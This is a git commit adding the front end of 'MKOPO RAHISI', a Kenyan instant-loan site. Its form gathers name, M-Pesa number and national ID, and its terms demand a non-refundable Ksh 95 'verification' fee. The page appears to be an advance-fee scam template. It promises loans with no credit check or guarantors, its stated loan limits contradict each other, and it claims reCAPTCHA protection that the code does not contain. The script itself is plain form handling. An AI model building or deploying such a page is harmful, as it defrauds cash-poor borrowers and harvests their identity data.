119ae2837dcb3aca1c844beab0593e73c7829f77
grandson <robinnhood64@gmail.com>
2023-03-10 19:12:15 +0300

    new commit

---
+++ assets/js/script.js
@@ -0,0 +1,160 @@
+$(function() {
+    $("#form-app").validate({
+        rules: {
+            first_name: {
+                required: true,
+                minlength: 2,
+                maxlength: 30
+            },
+            last_name: {
+                required: true,
+                minlength: 2,
+                maxlength: 30
+            },
+            phone_number: {
+                required: true,
+                minlength: 10,
+                maxlength: 15
+            },
+            id_number: {
+                required: true,
+                minlength: 8,
+                maxlength: 15
+            },
+            amount: {
+                required: true,
+                minlength: 4,
+                maxlength: 5
+            },
+            loan_type_id: {
+                required: true,
+            }
+        },
+        messages: {
+            first_name: {
+                required: 'Please enter your first name',
+            },
+            last_name: {
+                required: 'Please enter your last name',
+            },
+            phone_number: {
+                required: 'Please enter your phone number'
+            },
+            id_number: {
+                required: 'Please enter your ID number'
+            },
+            loan_type_id: {
+                required: 'Please select loan type'
+            },
+            amount: {
+                required: 'Please enter loan amount'
+            }
+        },
+        submitHandler: function(ev) {
+            $(ev).ajaxSubmit({
+                type: 'POST',
+                url: './apply/',
+                data: '',
+                dataType: 'json',
+                success: function(data) {
+                    if (data.success == 0) {
+                        Swal.fire({
+                            text: data.message,
+                            icon: "error",
+                            buttons: false,
+                            closeOnClickOutside: false,
+                            timer: 3000,
+                        }).then((state)=>{}
+                        );
+                    } else if (data.success == 1) {
+                        Swal.fire({
+                            text: data.message,
+                            icon: "success",
+                            buttons: false,
+                            timer: 10000,
+                        }).then((state)=>{
+                            window.location.reload();
+                        }
+                        );
+                    }
+                }
+            });
+        },
+        errorPlacement: function(error, element) {},
+        invalidHandler: function(form, validator) {
+            var errors = validator.numberOfInvalids();
+            if (errors) {
+                var message = errors == 1 ? 'Please correct the following error:\n' : 'Please correct the following ' + errors + ' errors.\n';
+                var errors = "";
+                console.log(errors);
+                if (validator.errorList.length > 0) {
+                    for (x = 0; x < validator.errorList.length; x++) {
+                        errors += "<br>" + validator.errorList[x].message;
+                    }
+                }
+                Swal.fire({
+                    title: message,
+                    html: errors,
+                    icon: "warning"
+                });
+            }
+            validator.focusInvalid();
+        }
+    });
+});
+function check_eligibility() {
+    var phone_number = $('#phone_number').val();
+    if (phone_number == '') {
+        Swal.fire({
+            title: 'Error',
+            text: 'Enter Mobile Number',
+            icon: "warning"
+        });
+    } else {
+        $.ajax({
+            url: './check/',
+            type: "POST",
+            data: $('#form-app').serialize(),
+            dataType: "JSON",
+            success: function(data) {
+                if (data.success == 1) {
+                    Swal.fire({
+                        text: data.message,
+                        icon: "success",
+                        buttons: false,
+                    }).then((result)=>{
+                        $('#btnCheck').hide();
+                        $('#btnSave').show();
+                        $('#row-amount').show();
+                        $('#app-title').html(data.message);
+                        $('#app-title').show();
+                    }
+                    );
+                } else {
+                    Swal.fire({
+                        text: data.message,
+                        icon: "error"
+                    });
+                }
+            },
+            error: function(jqXHR, textStatus, errorThrown) {
+                Swal.fire({
+                    title: 'Error',
+                    text: textStatus,
+                    icon: "error"
+                });
+            }
+        });
+    }
+}
+;$(document).ready(function() {
+    $(document).ajaxSend(function(event, request, settings) {
+        $.LoadingOverlay("show");
+    });
+    $(document).ajaxStop(function(event, request, settings) {
+        $.LoadingOverlay("hide");
+    });
+    $(document).ajaxComplete(function(event, request, settings) {
+        $.LoadingOverlay("hide");
+    });
+});
---
+++ index.php
@@ -0,0 +1,240 @@
+<!DOCTYPE html>
+<head>
+<meta name="facebook-domain-verification" content="" />
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>MKOPO RAHISI</title>
+<meta name="title" content="Loan App">
+<meta name="csrf-token" content="">
+<link rel="canonical" href="index.html">
+<meta name="robots" content="index, follow" />
+<meta name="referrer" content="origin-when-cross-origin">
+<meta content="True" name="HandheldFriendly">
+
+<meta name="description" content="">
+<meta name="keywords" content="MKOPO RAHISI App">
+
+<meta itemprop="name" content="MKOPO RAHISI App">
+<meta itemprop="description" content="">
+<meta name="keywords" content="MKOPO RAHISI App, ">
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="index.html">
+<link rel="icon" type="image/png" sizes="32x32" href="index.html">
+<link rel="icon" type="image/png" sizes="16x16" href="index.html">
+<meta name="theme-color" content="#564FF9">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@0,400;0,500;0,700;1,400;1,500;1,700&amp;display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">
+
+<link rel="stylesheet" type="text/css" href="https://use.fontawesome.com/releases/v6.1.1/css/all.css">
+
+<link rel="stylesheet" type="text/css" href="assets/css/style.css">
+<link rel="stylesheet" type="text/css" href="assets/css/responsive.css">
+<link rel="stylesheet" type="text/css" href="assets/css/animation.css">
+<script type="text/javascript" class="flasher-js">(function () { var rootScript = 'https://cdn.jsdelivr.net/npm/@flasher/flasher@1.2.3/dist/flasher.min.js'; var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); function mergeOptions(first, second) { return { context: merge(first.context || {}, second.context || {}), envelopes: merge(first.envelopes || [], second.envelopes || []), options: merge(first.options || {}, second.options || {}), scripts: merge(first.scripts || [], second.scripts || []), styles: merge(first.styles || [], second.styles || []), }; } function merge(first, second) { if (Array.isArray(first) && Array.isArray(second)) { return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); } return Object.assign({}, first, second); } function renderOptions(options) { if (!window.hasOwnProperty('flasher')) { console.error('Flasher is not loaded'); return; } requestAnimationFrame(function () { window.flasher.render(options); }); } function render(options) { if ('loading' !== document.readyState) { renderOptions(options); return; } document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); } if (1 === document.querySelectorAll('script.flasher-js').length) { document.addEventListener('flasher:render', function (event) { render(event.detail); }); } if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { render(options); } else { var tag = document.createElement('script'); tag.setAttribute('src', rootScript); tag.setAttribute('type', 'text/javascript'); tag.onload = function () { render(options); }; document.head.appendChild(tag); } })();</script>
+
+<body>
+
+<div class="boxed_wrapper">
+ 
+
+
+<section class="sign-up-form">
+<div class="container">
+<div class="wrapper">
+<div class="sign-up-form-inner">
+<div class="row">
+<div class="tab-100 col-sm-12 col-md-6 custom-width">
+
+<div class="brand-name">
+<a href="index.html">MKOPO RAHISI</a>
+</div>
+
+<div class="about order-2">
+<h1>PESA
+CHAPHAP</h1>
+<p>
+Let us help you sort your expenses - top up a loan, rental loan, car loan or
+emergencies
+</p>
+</div>
+</div>
+<div class="tab-100 col-sm-12 col-md-6  custom-width">
+<div class="pop-right reg-form" id="div-reg">
+<div class="container">
+<div class="wrapper order-1">
+
+<h3 class="signin-none">Find Your Loan Eligibility</h3>
+
+<form id="form-app" action="./eligibility/" onsubmit="return false;" method="post" enctype="multipart/form-data">
+
+<span class="signin-none text-center" id="app-title" style="display: none;">You can qualify for Ksh. 500
+-25,000 loan to MPESA</span>
+
+<div class="row">
+<div class="signin-none tab-100 col-md-6">
+<input type="text" id="first_name" name="first_name" placeholder="First Name" autofocus autocomplete="off" required>
+</div>
+<div class="signin-none tab-100 col-md-6">
+<input type="text" id="last_name" name="last_name" placeholder="Last Name" autocomplete="off" required>
+</div>
+</div>
+<div class="row">
+<div class="signin-none tab-100 col-md-12">
+<input type="tel" id="phone_number" name="phone_number" pattern="[0]{1}[0-9]{9}" maxlength="10" minlength="10" placeholder="Mpesa Phone Number: 0718******" autocomplete="off" required>
+</div>
+</div>
+<div class="row">
+<div class="signin-none tab-100 col-md-12">
+ <input type="text" id="id_number" name="id_number" placeholder="National ID Number" autocomplete="off" required>
+</div>
+</div>
+<div class="row">
+<div class="signin-none tab-100 col-md-12">
+<select class="form-control" name="loan_type_id" id="loan_type_id" autocomplete="off" required>
+<option value="">Select Loan Type</option>
+<option value="1">Education Loan</option>
+<option value="2" selected>Emergency Loan</option>
+</select>
+</div>
+</div>
+<div class="row" id="row-amount" style="display: none;">
+<div class="signin-none tab-100 col-md-12">
+<input type="number" id="amount" name="amount" placeholder="Loan Amount" autocomplete="off" required>
+</div>
+</div>
+<div class="row">
+<div class="signin-none tab-100 col-md-12">
+<label class="signin-none text-center">
+<span class="text-center">
+<small>No CRB Check. No Guarantors . Disbursed to MPESA
+. No Paperwork</small>
+</span>
+</label>
+</div>
+</div>
+<div class="row">
+<div class="signin-none tab-100 col-md-12">
+<div class="reg-button">
+
+<button id="btnCheck" class="signin-none sign-up align-content-center" onclick="check_eligibility();return false;"><i class="fa fa-arrow-right"></i> Find
+your loan eligibility </button>
+<button id="btnSave" style="display: none;" class="signin-none sign-up align-content-center"><i class="fa fa-check"></i> Apply
+Loan Now</button>
+</div>
+</div>
+</div>
+<div class="row">
+<div class="signin-none tab-100 col-md-12">
+<label class="signin-none">
+ <span>
+By submitting you confirm that you accept the <a data-bs-toggle="modal" data-bs-target="#terms" style="color:#564FF9;">Terms and Conditions</a> and
+<a data-bs-toggle="modal" data-bs-target="#policy" style="color:#564FF9;">Privacy Policy</a>
+</span>
+</label>
+</div>
+</div>
+</form>
+
+<div class="copyright">
+Protected by reCAPTCHA and subject to the Google <a href="https://policies.google.com/privacy?hl=en" target="_blank">Privacy Policy</a> and <a href="https://policies.google.com/terms?hl=en" target="_blank">Terms
+of Service</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<div class="modal fade" id="policy" tabindex="-1" aria-labelledby="policy" aria-hidden="true">
+<div class="modal-dialog">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title" id="policy">Loan Policies</h5>
+<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+</div>
+<div class="modal-body">
+We care about your privacy, data protection, and confidentiality. This Privacy policy
+<strong>(hereinafter – “Privacy policy”)</strong> states, what information we collect, for which
+purposes and means, and what are your rights.
+<p> When is this Privacy policy applicable?</p>
+<p>This Privacy policy applies when:</p>
+<p>
+You use or have expressed the intention to use any of our Services;
+You represent a Client (for example as a guarantor, the payer, authorized representative,
+next of kin etc.) or you have been indicated as the contact person for the Client;</p>
+<p>
+You have used our Services in the past and we are required to retain this information;</p>
+<p>
+You contact us or visit any of our representative and customer service offices;
+You visit our website;</p>
+<p>
+In any other way provide us with your personal data for any of the data processing purposes
+set in this Privacy policy.
+</p>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="terms" tabindex="-1" aria-labelledby="terms" aria-hidden="true">
+ <div class="modal-dialog">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title" id="terms">Terms and Conditions</h5>
+<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+</div>
+<div class="modal-body">
+<p>Loan facilities borrowed under this product will be hinged on pre- existing
+products features.
+</p>
+<p>
+In case of default of the USSD loans; the loan product facility shall be deemed to be in
+arrears and normal collection Processes shall apply.
+</p>
+<p>
+The maximum loan amount: Ksh 15,000 fee of Ksh. 95 <strong> Non-refundable fee</strong> is
+paid by borrower for detail verification
+</p>
+<p>
+Maximum Loan duration: Loan should be repayable in 1 Month (30 Days) from the day of
+borrowing
+</p>
+<p>
+Loan disbursement: Loan will be disbursed to the MPESA number provided & takes 5-7 working
+days to be processed.
+</p>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+
+</div>
+
+<script src="assets/js/bootstrap.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js'></script>
+
+<script src="assets/js/custom.js?v=1"></script>
+<script src="assets/js/script.js?v=2"></script>
+<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="assets/js/jquery.validate.min.js"></script>
+<script src="assets/js/jquery-form.min.js"></script>
+<script src="assets/js/loadingoverlay.min.js" type="text/javascript"></script>
+<script src="assets/js/loadingoverlay_progress.min.js" type="text/javascript"></script>
+</body>
+
+</html>
